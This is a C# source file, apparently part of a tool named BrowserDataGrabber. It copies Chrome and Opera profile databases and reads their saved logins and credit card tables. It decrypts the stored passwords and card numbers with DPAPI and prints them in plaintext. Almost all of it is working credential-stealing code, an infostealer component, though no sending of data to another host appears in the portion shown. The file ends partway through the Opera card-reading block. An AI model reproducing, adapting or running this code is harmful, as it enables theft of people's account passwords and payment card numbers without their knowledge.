namespace BrowserDataGrabber
{
    public class Browser
    {
        // Google Chrome
        public static void ExtractGoogleChromeData()
        {
            System.Console.WriteLine("// Extract Google Chrome Data");

            if (Configuration.s_r_googleChromeMainDirectoryPath != null && Configuration.s_r_googleChromeUserDataDirectoryPath != null && Configuration.s_r_googleChromeDefaultFolderPath != null)
            {
                // Google Chrome Main Directory
                System.Console.WriteLine("Google Chrome Main Directory Path: " + Configuration.s_r_googleChromeMainDirectoryPath);

                if (System.IO.Directory.Exists(Configuration.s_r_googleChromeMainDirectoryPath))
                {
                    System.Console.WriteLine("Google Chrome Main Directory: Exists \n");

                    // Local Directory Creation
                    string localGoogleChromeMainDirectoryPath = null;

                    if (Environment.s_r_applicationDirectoryPath != null && System.IO.Directory.Exists(Environment.s_r_applicationDirectoryPath))
                    {
                        localGoogleChromeMainDirectoryPath = System.IO.Path.Combine(Environment.s_r_applicationDirectoryPath, Configuration.s_r_googleChromeMainDirectory);

                        if (!System.IO.Directory.Exists(localGoogleChromeMainDirectoryPath))
                        {
                            Utils.CreateDirectory(localGoogleChromeMainDirectoryPath);
                        }
                    }
                    // - Local Directory Creation

                    // Google Chrome "User Data" Directory
                    System.Console.WriteLine("Google Chrome \"User Data\" Directory Path: " + Configuration.s_r_googleChromeUserDataDirectoryPath);

                    if (System.IO.Directory.Exists(Configuration.s_r_googleChromeUserDataDirectoryPath))
                    {
                        System.Console.WriteLine("Google Chrome \"User Data\" Directory: Exists \n");

                        // Local Directory Creation
                        string localGoogleChromeUserDataDirectoryPath = null;

                        if (Environment.s_r_applicationDirectoryPath != null && System.IO.Directory.Exists(Environment.s_r_applicationDirectoryPath))
                        {
                            localGoogleChromeUserDataDirectoryPath = System.IO.Path.Combine(Environment.s_r_applicationDirectoryPath, Configuration.s_r_googleChromeUserDataDirectory);

                            if (!System.IO.Directory.Exists(localGoogleChromeUserDataDirectoryPath))
                            {
                                Utils.CreateDirectory(localGoogleChromeUserDataDirectoryPath);
                            }
                        }
                        // - Local Directory Creation

                        string loginDataFileName = "Login Data"; // Login Data File Name
                        string webDataFileName = "Web Data"; // Web Data File Name

                        // Profiles Files
                        foreach (System.IO.DirectoryInfo subDirectoryInfo in new System.IO.DirectoryInfo(Configuration.s_r_googleChromeUserDataDirectoryPath).GetDirectories())
                        {
                            if (subDirectoryInfo.Exists)
                            {
                                foreach (System.IO.FileInfo fileInfo in subDirectoryInfo.GetFiles())
                                {
                                    if (fileInfo.Exists && (fileInfo.Name.Equals(loginDataFileName) || fileInfo.Name.Equals(webDataFileName)))
                                    {
                                        string destDirectoryPath = System.IO.Path.Combine(localGoogleChromeUserDataDirectoryPath, subDirectoryInfo.Name);

                                        if (destDirectoryPath != null)
                                        {
                                            Utils.CreateDirectoryIfNotExists(destDirectoryPath);

                                            if (System.IO.Directory.Exists(destDirectoryPath))
                                            {
                                                string sourceFilePath = System.IO.Path.Combine(Configuration.s_r_googleChromeUserDataDirectoryPath, System.IO.Path.Combine(subDirectoryInfo.Name, fileInfo.Name));
                                                string destFilePath = System.IO.Path.Combine(localGoogleChromeUserDataDirectoryPath, System.IO.Path.Combine(subDirectoryInfo.Name, fileInfo.Name));

                                                if (sourceFilePath != null && destFilePath != null)
                                                {
                                                    Utils.CopyFile(sourceFilePath, destFilePath, true);
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                        // - Profiles Files

                        // Extract Data From "Login Data" & "Web Data" Files
                        // Login Data
                        // Table(s)
                        string loginDataLoginsTable = "logins";
                        // - Table(s)

                        // Column(s)
                        string loginDataLoginsTableOriginUrlColumn = "origin_url"; // VARCHAR
                        string loginDataLoginsTableActionUrlColumn = "action_url"; // VARCHAR
                        string loginDataLoginsTableUsernameElementColumn = "username_element"; // VARCHAR
                        string loginDataLoginsTableUsernameValueColumn = "username_value"; // VARCHAR
                        string loginDataLoginsTablePasswordElementColumn = "password_element"; // VARCHAR
                        string loginDataLoginsTablePasswordValueColumn = "password_value"; // BLOB (Encrypted)
                        string loginDataLoginsTableDateCreatedColumn = "date_created"; // INTEGER
                        string loginDataLoginsTableTimesUsedColumn = "times_used"; // INTEGER
                        // - Column(s)

                        // SQL Command(s)
                        string getLoginsSqlCommand = "SELECT ";

                        getLoginsSqlCommand += loginDataLoginsTableOriginUrlColumn + ", ";
                        getLoginsSqlCommand += loginDataLoginsTableActionUrlColumn + ", ";
                        getLoginsSqlCommand += loginDataLoginsTableUsernameElementColumn + ", ";
                        getLoginsSqlCommand += loginDataLoginsTableUsernameValueColumn + ", ";
                        getLoginsSqlCommand += loginDataLoginsTablePasswordElementColumn + ", ";
                        getLoginsSqlCommand += loginDataLoginsTablePasswordValueColumn + ", ";
                        getLoginsSqlCommand += loginDataLoginsTableDateCreatedColumn + ", ";
                        getLoginsSqlCommand += loginDataLoginsTableTimesUsedColumn;

                        getLoginsSqlCommand += " FROM " + loginDataLoginsTable + ";";
                        // - SQL Command(s)

                        foreach (string directory in System.IO.Directory.GetDirectories(localGoogleChromeUserDataDirectoryPath))
                        {
                            string connectionString = "Data Source=" + System.IO.Path.Combine(directory, loginDataFileName);

                            System.Data.SQLite.SQLiteConnection loginsConnection = new System.Data.SQLite.SQLiteConnection(connectionString);

                            loginsConnection.Open();

                            System.Data.SQLite.SQLiteCommand retrieveData = loginsConnection.CreateCommand();
                            retrieveData.CommandType = System.Data.CommandType.Text;
                            retrieveData.CommandText = getLoginsSqlCommand;

                            System.Data.SQLite.SQLiteDataReader data = retrieveData.ExecuteReader(System.Data.CommandBehavior.KeyInfo);

                            System.Collections.Generic.List<string> decryptedData = new System.Collections.Generic.List<string>();

                            while (data.Read())
                            {
                                string originUrl = data[loginDataLoginsTableOriginUrlColumn].ToString();
                                string actionUrl = data[loginDataLoginsTableActionUrlColumn].ToString();
                                string usernameElement = data[loginDataLoginsTableUsernameElementColumn].ToString();
                                string usernameValue = data[loginDataLoginsTableUsernameValueColumn].ToString();
                                string passwordElement = data[loginDataLoginsTablePasswordElementColumn].ToString();
                                byte[] passwordValue = (byte[])data[loginDataLoginsTablePasswordValueColumn];
                                string dateCreated = data[loginDataLoginsTableDateCreatedColumn].ToString();
                                string timesUsed = data[loginDataLoginsTableTimesUsedColumn].ToString();

                                // Encrypted
                                string passwordValueDecrypted = System.Text.Encoding.Default.GetString(DPAPI.DecryptBytes(passwordValue));
                                // - Encrypted

                                if (decryptedData != null)
                                {
                                    decryptedData.Add(
                                    originUrl + System.IO.Path.PathSeparator
                                    + actionUrl + System.IO.Path.PathSeparator
                                    + usernameElement + System.IO.Path.PathSeparator
                                    + usernameValue + System.IO.Path.PathSeparator
                                    + passwordElement + System.IO.Path.PathSeparator
                                    + passwordValueDecrypted + System.IO.Path.PathSeparator
                                    + dateCreated + System.IO.Path.PathSeparator
                                    + timesUsed);
                                }
                            }

                            if (decryptedData != null && decryptedData.Count > 0 && loginDataLoginsTable.Equals(data.GetTableName(0)))
                            {
                                System.Console.WriteLine(System.IO.Path.Combine(new System.IO.DirectoryInfo(directory).Name, loginDataFileName) + " - Table \"" + loginDataLoginsTable + "\": "
                                    + loginDataLoginsTableOriginUrlColumn + System.IO.Path.PathSeparator
                                    + loginDataLoginsTableActionUrlColumn + System.IO.Path.PathSeparator
                                    + loginDataLoginsTableUsernameElementColumn + System.IO.Path.PathSeparator
                                    + loginDataLoginsTableUsernameValueColumn + System.IO.Path.PathSeparator
                                    + loginDataLoginsTablePasswordElementColumn + System.IO.Path.PathSeparator
                                    + loginDataLoginsTablePasswordValueColumn + " (Decrypted)" + System.IO.Path.PathSeparator
                                    + loginDataLoginsTableDateCreatedColumn + System.IO.Path.PathSeparator
                                    + loginDataLoginsTableTimesUsedColumn + System.IO.Path.PathSeparator);

                                decryptedData.ForEach(item => System.Console.WriteLine(item));
                            }
                            else
                            {
                                System.Console.WriteLine(System.IO.Path.Combine(new System.IO.DirectoryInfo(directory).Name, loginDataFileName) + " - Table \"" + loginDataLoginsTable + "\": No data found");
                            }

                            data.Close();
                            data.Dispose();

                            retrieveData.Reset();
                            retrieveData.Dispose();

                            loginsConnection.Close();
                            loginsConnection.Dispose();
                        }
                        // - Login Data

                        // Web Data
                        // Table(s)
                        string webDataCreditCardsTable = "credit_cards";
                        // - Table(s)

                        // Column(s)
                        string webDataCreditCardsTableNameOnCardColumn = "name_on_card"; // VARCHAR
                        string webDataCreditCardsTableExpirationMonthColumn = "expiration_month"; // INTEGER
                        string webDataCreditCardsTableExpirationYearColumn = "expiration_year"; // INTEGER
                        string webDataCreditCardsTableCardNumberEncryptedColumn = "card_number_encrypted"; // BLOB (Encrypted)
                        string webDataCreditCardsTableDateModifiedColumn = "date_modified"; // INTEGER
                        string webDataCreditCardsTableUseCountColumn = "use_count"; // INTEGER
                        string webDataCreditCardsTableUseDateColumn = "use_date"; // INTEGER
                        // - Column(s)

                        // SQL Command(s)
                        string getCreditCardsSqlCommand = "SELECT ";

                        getCreditCardsSqlCommand += webDataCreditCardsTableNameOnCardColumn + ", ";
                        getCreditCardsSqlCommand += webDataCreditCardsTableExpirationMonthColumn + ", ";
                        getCreditCardsSqlCommand += webDataCreditCardsTableExpirationYearColumn + ", ";
                        getCreditCardsSqlCommand += webDataCreditCardsTableCardNumberEncryptedColumn + ", ";
                        getCreditCardsSqlCommand += webDataCreditCardsTableDateModifiedColumn + ", ";
                        getCreditCardsSqlCommand += webDataCreditCardsTableUseCountColumn + ", ";
                        getCreditCardsSqlCommand += webDataCreditCardsTableUseDateColumn;

                        getCreditCardsSqlCommand += " FROM " + webDataCreditCardsTable + ";";
                        // - SQL Command(s)

                        foreach (string directory in System.IO.Directory.GetDirectories(localGoogleChromeUserDataDirectoryPath))
                        {
                            string connectionString = "Data Source=" + System.IO.Path.Combine(directory, webDataFileName);

                            System.Data.SQLite.SQLiteConnection creditCardsConnection = new System.Data.SQLite.SQLiteConnection(connectionString);

                            creditCardsConnection.Open();

                            System.Data.SQLite.SQLiteCommand retrieveData = creditCardsConnection.CreateCommand();
                            retrieveData.CommandType = System.Data.CommandType.Text;
                            retrieveData.CommandText = getCreditCardsSqlCommand;

                            System.Data.SQLite.SQLiteDataReader data = retrieveData.ExecuteReader(System.Data.CommandBehavior.KeyInfo);

                            System.Collections.Generic.List<string> decryptedData = new System.Collections.Generic.List<string>();

                            while (data.Read())
                            {
                                string nameOnCard = data[webDataCreditCardsTableNameOnCardColumn].ToString();
                                string expirationMonth = data[webDataCreditCardsTableExpirationMonthColumn].ToString();
                                string expirationYear = data[webDataCreditCardsTableExpirationYearColumn].ToString();
                                byte[] cardNumberEncrypted = (byte[])data[webDataCreditCardsTableCardNumberEncryptedColumn];
                                string dateModified = data[webDataCreditCardsTableDateModifiedColumn].ToString();
                                string useCount = data[webDataCreditCardsTableUseCountColumn].ToString();
                                string useDate = data[webDataCreditCardsTableUseDateColumn].ToString();

                                // Encrypted
                                string cardNumberEncryptedDecrypted = System.Text.Encoding.Default.GetString(DPAPI.DecryptBytes(cardNumberEncrypted));
                                // - Encrypted

                                if (decryptedData != null)
                                {
                                    decryptedData.Add(
                                    nameOnCard + System.IO.Path.PathSeparator
                                    + expirationMonth + System.IO.Path.PathSeparator
                                    + expirationYear + System.IO.Path.PathSeparator
                                    + cardNumberEncryptedDecrypted + System.IO.Path.PathSeparator
                                    + dateModified + System.IO.Path.PathSeparator
                                    + useCount + System.IO.Path.PathSeparator
                                    + useDate);
                                }
                            }

                            if (decryptedData != null && decryptedData.Count > 0 && webDataCreditCardsTable.Equals(data.GetTableName(0)))
                            {
                                System.Console.WriteLine(System.IO.Path.Combine(new System.IO.DirectoryInfo(directory).Name, webDataFileName) + " - Table \"" + webDataCreditCardsTable + "\": "
                                    + webDataCreditCardsTableNameOnCardColumn + System.IO.Path.PathSeparator
                                    + webDataCreditCardsTableExpirationMonthColumn + System.IO.Path.PathSeparator
                                    + webDataCreditCardsTableExpirationYearColumn + System.IO.Path.PathSeparator
                                    + webDataCreditCardsTableCardNumberEncryptedColumn + " (Decrypted)" + System.IO.Path.PathSeparator
                                    + webDataCreditCardsTableDateModifiedColumn + System.IO.Path.PathSeparator
                                    + webDataCreditCardsTableUseCountColumn + System.IO.Path.PathSeparator
                                    + webDataCreditCardsTableUseDateColumn);

                                decryptedData.ForEach(item => System.Console.WriteLine(item));
                            }
                            else
                            {
                                System.Console.WriteLine(System.IO.Path.Combine(new System.IO.DirectoryInfo(directory).Name, webDataFileName) + " - Table \"" + webDataCreditCardsTable + "\": No data found");
                            }

                            data.Close();
                            data.Dispose();

                            retrieveData.Reset();
                            retrieveData.Dispose();

                            creditCardsConnection.Close();
                            creditCardsConnection.Dispose();
                        }
                        // - Web Data
                        // - Extract Data From "Login Data" & "Web Data" Files
                    }
                    else
                    {
                        System.Console.WriteLine("Google Chrome \"User Data\" Directory: Not Exists \n");
                    }
                    // - Google Chrome "User Data" Directory
                }
                else
                {
                    System.Console.WriteLine("Google Chrome Main Directory: Not Exists \n");
                }
                // - Google Chrome Main Directory
            }

            System.Console.WriteLine("// - Extract Google Chrome Data \n");
        }
        // - Google Chrome

        // Opera (Stable, Next, Developer)
        public static void ExtractOperaData(string versionType)
        {
            bool operaStable = false, operaNext = false, operaDeveloper = false;

            if (versionType == null || versionType.Equals(Configuration.s_r_operaStable))
            {
                System.Console.WriteLine("// Extract Opera Stable Data");

                operaStable = true;
            }
            else if (versionType.Equals(Configuration.s_r_operaNext))
            {
                System.Console.WriteLine("// Extract Opera Next Data");

                operaNext = true;
            }
            else if (versionType.Equals(Configuration.s_r_operaDeveloper))
            {
                System.Console.WriteLine("// Extract Opera Developer Data");

                operaDeveloper = true;
            }

            string loginDataFileName = "Login Data"; // Login Data File Name (Same as Google Chrome & Chromium)
            string webDataFileName = "Web Data"; // Web Data File Name (Same as Google Chrome & Chromium)

            string loginDataCopiedFilePath = null;
            string webDataCopiedFilePath = null;

            // Opera Stable
            if (operaStable && Configuration.s_r_operaStableMainDirectoryPath != null)
            {
                // Opera Stable Main Directory
                System.Console.WriteLine("Opera Stable Main Directory Path: " + Configuration.s_r_operaStableMainDirectoryPath);

                if (System.IO.Directory.Exists(Configuration.s_r_operaStableMainDirectoryPath))
                {
                    System.Console.WriteLine("Opera Stable Main Directory: Exists \n");

                    // Local Directory Creation
                    string localOperaStableMainDirectoryPath = null;

                    if (Environment.s_r_applicationDirectoryPath != null && System.IO.Directory.Exists(Environment.s_r_applicationDirectoryPath))
                    {
                        localOperaStableMainDirectoryPath = System.IO.Path.Combine(Environment.s_r_applicationDirectoryPath, Configuration.s_r_operaStableMainDirectory);

                        if (localOperaStableMainDirectoryPath != null && !System.IO.Directory.Exists(localOperaStableMainDirectoryPath))
                        {
                            Utils.CreateDirectory(localOperaStableMainDirectoryPath);
                        }
                    }
                    // - Local Directory Creation

                    // Opera Stable "Login Data" File
                    string loginDataFilePath = System.IO.Path.Combine(Configuration.s_r_operaStableMainDirectoryPath, loginDataFileName);

                    if (loginDataFilePath != null)
                    {
                        System.Console.WriteLine("Opera Stable \"Login Data\" File Path: " + loginDataFilePath);

                        if (System.IO.File.Exists(loginDataFilePath))
                        {
                            System.Console.WriteLine("Opera Stable \"Login Data\" File: Exists \n");

                            if (localOperaStableMainDirectoryPath != null && System.IO.Directory.Exists(localOperaStableMainDirectoryPath))
                            {
                                string copyFilePath = System.IO.Path.Combine(localOperaStableMainDirectoryPath, loginDataFileName);

                                if (copyFilePath != null)
                                {
                                    Utils.CopyFile(loginDataFilePath, copyFilePath, true);

                                    if (System.IO.File.Exists(copyFilePath))
                                    {
                                        loginDataCopiedFilePath = copyFilePath;
                                    }
                                }
                            }
                        }
                    }
                    else
                    {
                        System.Console.WriteLine("Opera Stable \"Login Data\" File: Not Exists, will not copy it \n");
                    }
                    // - Opera Stable "Login Data" File

                    // Opera Stable "Web Data" File
                    string webDataFilePath = System.IO.Path.Combine(Configuration.s_r_operaStableMainDirectoryPath, webDataFileName);

                    if (webDataFilePath != null)
                    {
                        System.Console.WriteLine("Opera Stable \"Web Data\" File Path: " + webDataFilePath);

                        if (System.IO.File.Exists(webDataFilePath))
                        {
                            System.Console.WriteLine("Opera Stable \"Web Data\" File: Exists \n");

                            if (localOperaStableMainDirectoryPath != null && System.IO.Directory.Exists(localOperaStableMainDirectoryPath))
                            {
                                string copyFilePath = System.IO.Path.Combine(localOperaStableMainDirectoryPath, webDataFileName);

                                if (copyFilePath != null)
                                {
                                    Utils.CopyFile(webDataFilePath, copyFilePath, true);

                                    if (System.IO.File.Exists(copyFilePath))
                                    {
                                        webDataCopiedFilePath = copyFilePath;
                                    }
                                }
                            }
                        }
                    }
                    else
                    {
                        System.Console.WriteLine("Opera Stable \"Web Data\" File: Not Exists, will not copy it \n");
                    }
                    // - Opera Stable "Web Data" File
                }
                else
                {
                    System.Console.WriteLine("Opera Stable Main Directory: Not Exists \n");
                }
                // - Opera Stable Main Directory
            }
            // - Opera Stable

            // Opera Next
            if (operaNext && Configuration.s_r_operaNextMainDirectoryPath != null)
            {
                // Opera Next Main Directory
                System.Console.WriteLine("Opera Next Main Directory Path: " + Configuration.s_r_operaNextMainDirectoryPath);

                if (System.IO.Directory.Exists(Configuration.s_r_operaNextMainDirectoryPath))
                {
                    System.Console.WriteLine("Opera Next Main Directory: Exists \n");

                    // Local Directory Creation
                    string localOperaNextMainDirectoryPath = null;

                    if (Environment.s_r_applicationDirectoryPath != null && System.IO.Directory.Exists(Environment.s_r_applicationDirectoryPath))
                    {
                        localOperaNextMainDirectoryPath = System.IO.Path.Combine(Environment.s_r_applicationDirectoryPath, Configuration.s_r_operaNextMainDirectory);

                        if (localOperaNextMainDirectoryPath != null && !System.IO.Directory.Exists(localOperaNextMainDirectoryPath))
                        {
                            Utils.CreateDirectory(localOperaNextMainDirectoryPath);
                        }
                    }
                    // - Local Directory Creation

                    // Opera Next "Login Data" File
                    string loginDataFilePath = System.IO.Path.Combine(Configuration.s_r_operaNextMainDirectoryPath, loginDataFileName);

                    if (loginDataFilePath != null)
                    {
                        System.Console.WriteLine("Opera Next \"Login Data\" File Path: " + loginDataFilePath);

                        if (System.IO.File.Exists(loginDataFilePath))
                        {
                            System.Console.WriteLine("Opera Next \"Login Data\" File: Exists \n");

                            if (localOperaNextMainDirectoryPath != null && System.IO.Directory.Exists(localOperaNextMainDirectoryPath))
                            {
                                string copyFilePath = System.IO.Path.Combine(localOperaNextMainDirectoryPath, loginDataFileName);

                                if (copyFilePath != null)
                                {
                                    Utils.CopyFile(loginDataFilePath, copyFilePath, true);

                                    if (System.IO.File.Exists(copyFilePath))
                                    {
                                        loginDataCopiedFilePath = copyFilePath;
                                    }
                                }
                            }
                        }
                    }
                    else
                    {
                        System.Console.WriteLine("Opera Next \"Login Data\" File: Not Exists, will not copy it \n");
                    }
                    // - Opera Next "Login Data" File

                    // Opera Next "Web Data" File
                    string webDataFilePath = System.IO.Path.Combine(Configuration.s_r_operaNextMainDirectoryPath, webDataFileName);

                    if (webDataFilePath != null)
                    {
                        System.Console.WriteLine("Opera Next \"Web Data\" File Path: " + webDataFilePath);

                        if (System.IO.File.Exists(webDataFilePath))
                        {
                            System.Console.WriteLine("Opera Next \"Web Data\" File: Exists \n");

                            if (localOperaNextMainDirectoryPath != null && System.IO.Directory.Exists(localOperaNextMainDirectoryPath))
                            {
                                string copyFilePath = System.IO.Path.Combine(localOperaNextMainDirectoryPath, webDataFileName);

                                if (copyFilePath != null)
                                {
                                    Utils.CopyFile(webDataFilePath, copyFilePath, true);

                                    if (System.IO.File.Exists(copyFilePath))
                                    {
                                        webDataCopiedFilePath = copyFilePath;
                                    }
                                }
                            }
                        }
                    }
                    else
                    {
                        System.Console.WriteLine("Opera Next \"Web Data\" File: Not Exists, will not copy it \n");
                    }
                    // - Opera Next "Web Data" File
                }
                else
                {
                    System.Console.WriteLine("Opera Next Main Directory: Not Exists \n");
                }
                // - Opera Next Main Directory
            }
            // - Opera Next

            // Opera Developer
            if (operaDeveloper && Configuration.s_r_operaDeveloperMainDirectoryPath != null)
            {
                // Opera Developer Main Directory
                System.Console.WriteLine("Opera Developer Main Directory Path: " + Configuration.s_r_operaDeveloperMainDirectoryPath);

                if (System.IO.Directory.Exists(Configuration.s_r_operaDeveloperMainDirectoryPath))
                {
                    System.Console.WriteLine("Opera Developer Main Directory: Exists \n");

                    // Local Directory Creation
                    string localOperaDeveloperMainDirectoryPath = null;

                    if (Environment.s_r_applicationDirectoryPath != null && System.IO.Directory.Exists(Environment.s_r_applicationDirectoryPath))
                    {
                        localOperaDeveloperMainDirectoryPath = System.IO.Path.Combine(Environment.s_r_applicationDirectoryPath, Configuration.s_r_operaDeveloperMainDirectory);

                        if (localOperaDeveloperMainDirectoryPath != null && !System.IO.Directory.Exists(localOperaDeveloperMainDirectoryPath))
                        {
                            Utils.CreateDirectory(localOperaDeveloperMainDirectoryPath);
                        }
                    }
                    // - Local Directory Creation

                    // Opera Developer "Login Data" File
                    string loginDataFilePath = System.IO.Path.Combine(Configuration.s_r_operaDeveloperMainDirectoryPath, loginDataFileName);

                    if (loginDataFilePath != null)
                    {
                        System.Console.WriteLine("Opera Developer \"Login Data\" File Path: " + loginDataFilePath);

                        if (System.IO.File.Exists(loginDataFilePath))
                        {
                            System.Console.WriteLine("Opera Developer \"Login Data\" File: Exists \n");

                            if (localOperaDeveloperMainDirectoryPath != null && System.IO.Directory.Exists(localOperaDeveloperMainDirectoryPath))
                            {
                                string copyFilePath = System.IO.Path.Combine(localOperaDeveloperMainDirectoryPath, loginDataFileName);

                                if (copyFilePath != null)
                                {
                                    Utils.CopyFile(loginDataFilePath, copyFilePath, true);

                                    if (System.IO.File.Exists(copyFilePath))
                                    {
                                        loginDataCopiedFilePath = copyFilePath;
                                    }
                                }
                            }
                        }
                    }
                    else
                    {
                        System.Console.WriteLine("Opera Developer \"Login Data\" File: Not Exists, will not copy it \n");
                    }
                    // - Opera Developer "Login Data" File

                    // Opera Developer "Web Data" File
                    string webDataFilePath = System.IO.Path.Combine(Configuration.s_r_operaDeveloperMainDirectoryPath, webDataFileName);

                    if (webDataFilePath != null)
                    {
                        System.Console.WriteLine("Opera Developer \"Web Data\" File Path: " + webDataFilePath);

                        if (System.IO.File.Exists(webDataFilePath))
                        {
                            System.Console.WriteLine("Opera Developer \"Web Data\" File: Exists \n");

                            if (localOperaDeveloperMainDirectoryPath != null && System.IO.Directory.Exists(localOperaDeveloperMainDirectoryPath))
                            {
                                string copyFilePath = System.IO.Path.Combine(localOperaDeveloperMainDirectoryPath, webDataFileName);

                                if (copyFilePath != null)
                                {
                                    Utils.CopyFile(webDataFilePath, copyFilePath, true);

                                    if (System.IO.File.Exists(copyFilePath))
                                    {
                                        webDataCopiedFilePath = copyFilePath;
                                    }
                                }
                            }
                        }
                    }
                    else
                    {
                        System.Console.WriteLine("Opera Developer \"Web Data\" File: Not Exists, will not copy it \n");
                    }
                    // - Opera Developer "Web Data" File
                }
                else
                {
                    System.Console.WriteLine("Opera Developer Main Directory: Not Exists \n");
                }
                // - Opera Developer Main Directory
            }
            // - Opera Developer

            // "Login Data" Copied File
            if (loginDataCopiedFilePath != null)
            {
                // Table(s)
                string loginDataLoginsTable = "logins";
                // - Table(s)

                // Column(s)
                string loginDataLoginsTableOriginUrlColumn = "origin_url"; // VARCHAR
                string loginDataLoginsTableActionUrlColumn = "action_url"; // VARCHAR
                string loginDataLoginsTableUsernameElementColumn = "username_element"; // VARCHAR
                string loginDataLoginsTableUsernameValueColumn = "username_value"; // VARCHAR
                string loginDataLoginsTablePasswordElementColumn = "password_element"; // VARCHAR
                string loginDataLoginsTablePasswordValueColumn = "password_value"; // BLOB (Encrypted)
                string loginDataLoginsTableDateCreatedColumn = "date_created"; // INTEGER
                string loginDataLoginsTableTimesUsedColumn = "times_used"; // INTEGER
                // - Column(s)

                // SQL Command(s)
                string getLoginsSqlCommand = "SELECT ";

                getLoginsSqlCommand += loginDataLoginsTableOriginUrlColumn + ", ";
                getLoginsSqlCommand += loginDataLoginsTableActionUrlColumn + ", ";
                getLoginsSqlCommand += loginDataLoginsTableUsernameElementColumn + ", ";
                getLoginsSqlCommand += loginDataLoginsTableUsernameValueColumn + ", ";
                getLoginsSqlCommand += loginDataLoginsTablePasswordElementColumn + ", ";
                getLoginsSqlCommand += loginDataLoginsTablePasswordValueColumn + ", ";
                getLoginsSqlCommand += loginDataLoginsTableDateCreatedColumn + ", ";
                getLoginsSqlCommand += loginDataLoginsTableTimesUsedColumn;

                getLoginsSqlCommand += " FROM " + loginDataLoginsTable + ";";
                // - SQL Command(s)

                string connectionString = "Data Source=" + loginDataCopiedFilePath;

                System.Data.SQLite.SQLiteConnection loginsConnection = new System.Data.SQLite.SQLiteConnection(connectionString);

                loginsConnection.Open();

                System.Data.SQLite.SQLiteCommand retrieveData = loginsConnection.CreateCommand();
                retrieveData.CommandType = System.Data.CommandType.Text;
                retrieveData.CommandText = getLoginsSqlCommand;

                System.Data.SQLite.SQLiteDataReader data = retrieveData.ExecuteReader(System.Data.CommandBehavior.KeyInfo);

                System.Collections.Generic.List<string> decryptedData = new System.Collections.Generic.List<string>();

                while (data.Read())
                {
                    string originUrl = data[loginDataLoginsTableOriginUrlColumn].ToString();
                    string actionUrl = data[loginDataLoginsTableActionUrlColumn].ToString();
                    string usernameElement = data[loginDataLoginsTableUsernameElementColumn].ToString();
                    string usernameValue = data[loginDataLoginsTableUsernameValueColumn].ToString();
                    string passwordElement = data[loginDataLoginsTablePasswordElementColumn].ToString();
                    byte[] passwordValue = (byte[])data[loginDataLoginsTablePasswordValueColumn];
                    string dateCreated = data[loginDataLoginsTableDateCreatedColumn].ToString();
                    string timesUsed = data[loginDataLoginsTableTimesUsedColumn].ToString();

                    // Encrypted
                    string passwordValueDecrypted = System.Text.Encoding.Default.GetString(DPAPI.DecryptBytes(passwordValue));
                    // - Encrypted

                    if (decryptedData != null)
                    {
                        decryptedData.Add(
                        originUrl + System.IO.Path.PathSeparator
                        + actionUrl + System.IO.Path.PathSeparator
                        + usernameElement + System.IO.Path.PathSeparator
                        + usernameValue + System.IO.Path.PathSeparator
                        + passwordElement + System.IO.Path.PathSeparator
                        + passwordValueDecrypted + System.IO.Path.PathSeparator
                        + dateCreated + System.IO.Path.PathSeparator
                        + timesUsed);
                    }
                }

                if (decryptedData != null && decryptedData.Count > 0 && loginDataLoginsTable.Equals(data.GetTableName(0)))
                {
                    System.Console.WriteLine(loginDataFileName + " - Table \"" + loginDataLoginsTable + "\": "
                        + loginDataLoginsTableOriginUrlColumn + System.IO.Path.PathSeparator
                        + loginDataLoginsTableActionUrlColumn + System.IO.Path.PathSeparator
                        + loginDataLoginsTableUsernameElementColumn + System.IO.Path.PathSeparator
                        + loginDataLoginsTableUsernameValueColumn + System.IO.Path.PathSeparator
                        + loginDataLoginsTablePasswordElementColumn + System.IO.Path.PathSeparator
                        + loginDataLoginsTablePasswordValueColumn + " (Decrypted)" + System.IO.Path.PathSeparator
                        + loginDataLoginsTableDateCreatedColumn + System.IO.Path.PathSeparator
                        + loginDataLoginsTableTimesUsedColumn + System.IO.Path.PathSeparator);

                    decryptedData.ForEach(item => System.Console.WriteLine(item));
                }
                else
                {
                    System.Console.WriteLine(loginDataFileName + " - Table \"" + loginDataLoginsTable + "\": No data found");
                }

                data.Close();
                data.Dispose();

                retrieveData.Reset();
                retrieveData.Dispose();

                loginsConnection.Close();
                loginsConnection.Dispose();
            }
            // - "Login Data" Copied File

            // "Web Data" Copied File
            if (webDataCopiedFilePath != null)
            {
                // Table(s)
                string webDataCreditCardsTable = "credit_cards";
                // - Table(s)

                // Column(s)
                string webDataCreditCardsTableNameOnCardColumn = "name_on_card"; // VARCHAR
                string webDataCreditCardsTableExpirationMonthColumn = "expiration_month"; // INTEGER
                string webDataCreditCardsTableExpirationYearColumn = "expiration_year"; // INTEGER
                string webDataCreditCardsTableCardNumberEncryptedColumn = "card_number_encrypted"; // BLOB (Encrypted)
                string webDataCreditCardsTableDateModifiedColumn = "date_modified"; // INTEGER
                string webDataCreditCardsTableUseCountColumn = "use_count"; // INTEGER
                string webDataCreditCardsTableUseDateColumn = "use_date"; // INTEGER
                // - Column(s)

                // SQL Command(s)
                string getCreditCardsSqlCommand = "SELECT ";

                getCreditCardsSqlCommand += webDataCreditCardsTableNameOnCardColumn + ", ";
                getCreditCardsSqlCommand += webDataCreditCardsTableExpirationMonthColumn + ", ";
                getCreditCardsSqlCommand += webDataCreditCardsTableExpirationYearColumn + ", ";
                getCreditCardsSqlCommand += webDataCreditCardsTableCardNumberEncryptedColumn + ", ";
                getCreditCardsSqlCommand += webDataCreditCardsTableDateModifiedColumn + ", ";
                getCreditCardsSqlCommand += webDataCreditCardsTableUseCountColumn + ", ";
                getCreditCardsSqlCommand += webDataCreditCardsTableUseDateColumn;

                getCreditCardsSqlCommand += " FROM " + webDataCreditCardsTable + ";";
                // - SQL Command(s)

                string connectionString = "Data Source=" + webDataCopiedFilePath;

                System.Data.SQLite.SQLiteConnection creditCardsConnection = new System.Data.SQLite.SQLiteConnection(connectionString);

                creditCardsConnection.Open();

                System.Data.SQLite.SQLiteCommand retrieveData = creditCardsConnection.CreateCommand();
                retrieveData.CommandType = System.Data.CommandType.Text;
                retrieveData.CommandText = getCreditCardsSqlCommand;

                System.Data.SQLite.SQLiteDataReader data = retrieveData.ExecuteReader(System.Data.CommandBehavior.KeyInfo);

                System.Collections.Generic.List<string> decryptedData = new System.Collections.Generic.List<string>();

                while (data.Read())
                {
                    string nameOnCard = data[webDataCreditCardsTableNameOnCardColumn].ToString();
                    string expirationMonth = data[webDataCreditCardsTableExpirationMonthColumn].ToString();
                    string expirationYear = data[webDataCreditCardsTableExpirationYearColumn].ToString();
